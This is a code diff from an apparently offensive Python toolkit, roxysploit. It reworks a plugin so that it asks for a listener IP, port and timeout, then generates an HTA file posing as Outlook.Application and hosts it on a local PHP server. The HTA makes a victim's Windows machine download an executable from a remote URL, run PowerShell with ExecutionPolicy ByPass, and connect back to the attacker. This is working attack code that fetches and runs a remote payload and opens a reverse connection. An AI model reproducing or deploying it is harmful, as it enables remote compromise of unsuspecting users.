@@ -71,10 +71,18 @@ def dash():
             print "Unknown syntax: %s" % (terminal)
 
 def aner():
-    default8 = "http://backdoor.url"
+    default8 = "127.0.0.1"
+    defpor = "443"
+    timedef = "60"
     time.sleep(0.2)
-    print "\033[1;94m[?]\033[1;m URL :: Give a url of the backdoor you want to execute on the victims browser"
-    url = raw_input('\033[1;92m[+]\033[1;m url: [' + default8 + ']: ') or default8
+    print "\033[1;94m[?]\033[1;m LHOST :: Give a listening ip address to get a connection back on"
+    lhost = raw_input('\033[1;92m[+]\033[1;m lhost: [' + default8 + ']: ') or default8
+
+    print "\033[1;94m[?]\033[1;m LHOST :: Give a listening port to connect on"
+    lport = raw_input('\033[1;92m[+]\033[1;m lport: [' + defpor + ']: ') or defpor
+
+    print "\033[1;94m[?]\033[1;m Timeout :: Set a timeout for the victim and you"
+    timeout = raw_input('\033[1;92m[+]\033[1;m timeout: [' + timedef + ']: ') or timedef
 
     yen = "yes"
     et = "yes"
@@ -83,12 +91,14 @@ def aner():
     print ""
     print "Name             Set Value"
     print "----             ----------"
-    print "Backdoor         %s" % (url)
+    print "Lhost            %s" % (lhost)
+    print "Lport            %s" % (lport)
+    print "Timeout          %s" % (timeout)
     print "Plugin           %s" % (fin)
     print "\n"
     et = raw_input("\033[1;94m[?]\033[1;m Execute Plugins? [" + yen + "]: ")  or yen
     if et == 'yes':
-        os.system('cd plugins && python shellgame-cli.py -k hello -c "cmd /c cd / & mkdir win & cd win & echo (wget "%s" -OutFile a.exe) > b.PS1 & powershell -ExecutionPolicy ByPass -File b.ps1 & a.exe" -p Outlook.Application -o index.hta' % (url))
+        os.system('cd plugins && python shellgame-cli.py -k hello -c "cmd /c cd / & mkdir win & cd win & echo (wget "https://github.com/Eitenne/roxysploit/raw/master/storage/mb_client.exe" -OutFile a.exe) > b.PS1 & powershell -ExecutionPolicy ByPass -File b.ps1 & a.exe --ip %s --port %s --timeout %s" -p Outlook.Application -o index.hta' % (lhost,lport,timeout))
     	os.system('cd plugins && php -S 0.0.0.0:80 &>/dev/null')
 	print "[*] http://0.0.0.0:80"
     elif et == 'no':
